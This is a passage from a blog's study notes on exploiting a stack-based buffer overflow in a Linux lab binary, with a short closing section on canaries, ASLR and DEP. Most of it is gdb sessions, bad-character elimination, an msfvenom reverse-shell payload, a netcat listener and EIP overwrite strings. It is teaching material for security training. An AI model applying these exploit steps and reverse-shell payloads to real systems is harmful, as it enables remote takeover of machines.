+0xffffd2b2:	0x00    0x55	0x55	0x55	0x55	0x55	0x55	0x55
+				 # |---&gt; "\x55"s begin
+
+0xffffd2ba: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
+0xffffd2c2: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
+&lt;SNIP&gt;
+</pre></table></code></div></div><p>Here we recognize at which address our “\x55” begins. From here, we can go further down and look for the place where our CHARS start.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>&lt;SNIP&gt;
+0xffffd5aa:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
+0xffffd5b2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
+0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
+												 # |---&gt; CHARS begin
+
+0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
+0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
+0xffffd5d2:	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b	0x1c
+&lt;SNIP&gt;
+</pre></table></code></div></div><p>If we look closely at it, we will see that it starts with <code class="language-plaintext highlighter-rouge">\x01</code> instead of <code class="language-plaintext highlighter-rouge">\x00</code>. We have already seen the warning during the execution that the <strong>null byte</strong> in our input was ignored. So we can note this character, remove it from our variable CHARS and adjust the number of our <code class="language-plaintext highlighter-rouge">\x55</code>.</p><p>Let’s see how many we need:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre># Substract the number of removed characters
+Buffer = "\x55" * (1040 - 255 - 4) = 781
+
+# "\x00" removed: 256 - 1 = 255 bytes
+ CHARS = "\x01\x02\x03...&lt;SNIP&gt;...\xfd\xfe\xff"
+ 
+   EIP = "\x66" * 4
+</pre></table></code></div></div><p>Now send the CHARS without Null Byte:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>(gdb) run $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff" + "\x66" * 4')
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff" + "\x66" * 4')
+Breakpoint 1, 0x56555551 in bowfunc ()
+</pre></table></code></div></div><p>The Stack now will look:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>(gdb) x/2000xb $esp+550
+
+&lt;SNIP&gt;
+0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
+0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
+												 # |----| &lt;- "\x09" expected
+
+0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
+&lt;SNIP&gt;
+</pre></table></code></div></div><p>Here it depends on our bytes’ correct order in the variable CHARS to see if any character changes, interrupts, or skips the order. Now we recognize that after the <code class="language-plaintext highlighter-rouge">x08</code>, we encounter the <code class="language-plaintext highlighter-rouge">\x00</code> instead of the <code class="language-plaintext highlighter-rouge">\x09</code> as expected. This tells us that this character is not allowed here and must be removed accordingly.</p><p>Let’s calculate again:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre># Substract the number of removed characters
+Buffer = "\x55" * (1040 - 254 - 4) = 782	
+
+# "\x00" &amp; "\x09" removed: 256 - 2 = 254 bytes
+ CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfd\xfe\xff" 
+ 
+   EIP = "\x66" * 4
+</pre></table></code></div></div><p>Now send the CHAR without <code class="language-plaintext highlighter-rouge">\x00</code> and <code class="language-plaintext highlighter-rouge">\x09</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>(gdb) run $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfc\xfd\xfe\xff" + "\x66" * 4')
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfc\xfd\xfe\xff" + "\x66" * 4')
+Breakpoint 1, 0x56555551 in bowfunc ()
+</pre></table></code></div></div><p>The Stack now will be:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>(gdb) x/2000xb $esp+550
+
+&lt;SNIP&gt;
+0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
+0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
+												 # |----| &lt;- "\x0a" expected
+
+0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
+&lt;SNIP&gt;
+</pre></table></code></div></div><p><strong>This process must be repeated until all characters that could interrupt the flow are removed.</strong></p><h2 id="generating-shellcode"><span class="mr-2">Generating Shellcode</span><a href="#generating-shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Before we generate our shellcode, we have to make sure that the individual components and properties match the target system. Therefore we have to pay attention to the following areas:</p><ul><li>Architecture<li>Platform<li>Bad Characters</ul><p>To generate with <strong>msfvenom</strong>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>zero@pio$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
+
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of c file: 425 bytes
+Saved as: shellcode
+</pre></table></code></div></div><blockquote class="prompt-info"><div><p>We must eliminate the chars with <code class="language-plaintext highlighter-rouge">--bad-chars "&lt;chars"</code></p></div></blockquote><p>Let’s replace our CHAR by the Shellcode:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817
+     NOPs = "\x90" * 124
+Shellcode = "\xda\xca\xba\xe4\x11...&lt;SNIP&gt;...\x5a\x22\xa2"
+      EIP = "\x66" * 4'
+</pre></table></code></div></div><p>Now send it and check it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...&lt;SNIP&gt;...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...&lt;SNIP&gt;...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
+
+Breakpoint 1, 0x56555551 in bowfunc () 
+
+gdb) x/2000xb $esp+550
+
+&lt;SNIP&gt;
+0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4
+						 # |----&gt; Shellcode begins
+&lt;SNIP&gt;
+</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>We can see all the info with the command <code class="language-plaintext highlighter-rouge">info proc all</code></p></div></blockquote><h2 id="identification-of-the-return-address"><span class="mr-2">Identification of the Return Address</span><a href="#identification-of-the-return-address" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To exploit it, first start a nc:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 31337
+</pre></table></code></div></div><p>Change the <strong>EIP</strong> by some address after <code class="language-plaintext highlighter-rouge">\x50</code> (for example from <code class="language-plaintext highlighter-rouge">0xffffd64c</code> -&gt; <code class="language-plaintext highlighter-rouge">\x4c\xd6\xff\xff</code>).</p><p>In the gbd:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba...&lt;SNIP&gt;...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
+</pre></table></code></div></div><hr /><h1 id="prevention-techniques-and-mechanisms">Prevention Techniques and Mechanisms</h1><p>The best prevention are:</p><h2 id="canaries"><span class="mr-2">Canaries</span><a href="#canaries" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The <strong>canaries</strong> are known values written to the stack between buffer and control data to detect buffer overflows. The principle is that in case of a buffer overflow, the canary would be overwritten first and that the operating system checks during runtime that the canary is present and unaltered.</p><h2 id="aslr"><span class="mr-2">ASLR</span><a href="#aslr" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><strong>Address Space Layout Randomization</strong> is a security mechanism against buffer overflows. It makes some types of attacks more difficult by making it difficult to find target addresses in memory. The operating system uses ASLR to hide the relevant memory addresses from us. So the addresses need to be guessed, where a wrong address most likely causes a crash of the program, and accordingly, only one attempt exists.</p><h2 id="dep"><span class="mr-2">DEP</span><a href="#dep" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><strong>Data Execution Preventions</strong> a security feature available in Windows XP, and later with Service Pack 2 (SP2) and above, programs are monitored during execution to ensure that they access memory areas cleanly. DEP terminates the program if a program attempts to call or access the program code in an unauthorized manner.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/notes/'>Notes</a>, <a href='/categories/vulnerabilities/'>Vulnerabilities</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/buffer/" class="post-tag no-text-decoration" >buffer</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Notes+%7C+Stack-Based+Buffer+Overflow+-+Linux+-+Zeropio%27s+Blog&url=zeropio.github.io%2Fnotes%2Fvulnerabilities%2Fbuffer-overflow-linux" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Notes+%7C+Stack-Based+Buffer+Overflow+-+Linux+-+Zeropio%27s+Blog&u=zeropio.github.io%2Fnotes%2Fvulnerabilities%2Fbuffer-overflow-linux" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=zeropio.github.io%2Fnotes%2Fvulnerabilities%2Fbuffer-overflow-linux&text=Notes+%7C+Stack-Based+Buffer+Overflow+-+Linux+-+Zeropio%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/notes/vulnerabilities/xss">Notes | Cross Site Scripting</a><li><a href="/notes/tools/commands">Notes | Commands</a><li><a href="/notes/vulnerabilities/session-security">Notes | Session Security</a><li><a href="/notes/vulnerabilities/others">Notes | Others</a><li><a href="/notes/vulnerabilities/server-side-attacks">Notes | Server Side Attacks</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/rootme/">rootme</a> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/bash/">bash</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/tool/">tool</a> <a class="post-tag" href="/tags/veryeasy/">veryeasy</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/notes/vulnerabilities/buffer-overflow-windows"><div class="card-body"> <em class="small" data-ts="1658527200" data-df="ll" > Jul 23, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Notes | Stack-Based Buffer Overflow - Windows</h3><div class="text-muted small"><p> Binary exploitation is usually the way to find the most advanced vulnerabilities in programs and operating systems and requires a lot of skill. A buffer overflow occurs when a program receives data...</p></div></div></a></div><div class="card"> <a href="/tryhackme/lazyadmin"><div class="card-body"> <em class="small" data-ts="1652047200" data-df="ll" > May 9, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe | LazyAdmin</h3><div class="text-muted small"><p> Enumeration We start a nmap at the IP. Nmap scan report for 10.10.46.20 Host is up (0.076s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh ...</p></div></div></a></div><div class="card"> <a href="/tryhackme/pickle-rick"><div class="card-body"> <em class="small" data-ts="1652047200" data-df="ll" > May 9, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe | Pickle Rick</h3><div class="text-muted small"><p> Enumeration We start a nmap at the IP. Nmap scan report for 10.10.253.214 Host is up (0.067s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/notes/web/web-applications" class="btn btn-outline-primary" prompt="Older"><p>Notes | Web Applications</p></a> <a href="/notes/vulnerabilities/buffer-overflow-windows" class="btn btn-outline-primary" prompt="Newer"><p>Notes | Stack-Based Buffer Overflow - Windows</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/zeropiowastaken">zeropio</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/rootme/">rootme</a> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/bash/">bash</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/tool/">tool</a> <a class="post-tag" href="/tags/veryeasy/">veryeasy</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3"></p><button type="button" class="btn btn-primary" aria-label="Update"> </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
